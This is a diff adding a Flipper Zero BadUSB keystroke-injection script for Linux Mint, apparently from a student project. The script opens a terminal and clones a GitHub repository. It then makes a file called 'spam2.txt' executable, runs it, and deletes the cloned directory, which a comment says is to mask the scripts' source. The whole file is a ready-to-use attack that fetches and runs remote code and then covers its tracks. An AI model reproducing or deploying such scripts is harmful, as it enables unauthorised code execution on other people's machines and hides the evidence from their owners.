@@ -1,0 +1,37 @@
+REM Authors: Nate and Alex
+REM Target OS: Linux Mint
+REM Script for the Flipper Zero to load and run spam2.txt, then delete the cloned Github repository's directory and its contents (can be edited to utilize spam.txt)
+DELAY 1000
+ALT F2
+DELAY 500
+REM The following line opens the linux terminal
+STRING gnome-terminal
+ENTER
+DELAY 1000
+REM The following line pulls Nate's Github repository for this project, which contains all of our scripts
+STRING git clone https://github.com/SnowyNate/flipperzeroproject.git
+ENTER
+DELAY 1500
+REM A copy of the Github repository for this project is stored in the user's home directory > flipperzeroproject
+STRING cd flipperzeroproject
+ENTER
+DELAY 300
+REM Initiates spam2.txt by marking it as an executable bash script
+STRING chmod +x spam2.txt
+ENTER
+DELAY 300
+STRING ./spam2.txt
+ENTER
+DELAY 25000
+ALT F4
+DELAY 300
+ALT F2
+DELAY 500
+REM After the original terminal running the script has been halted and closed, the code below deletes the flipperzeroproject directory and all of its files, masking the original source of the scripts.
+STRING gnome-terminal
+ENTER
+DELAY 1000
+STRING rm flipperzeroproject/ -f -r
+ENTER
+DELAY 300
+ALT F4
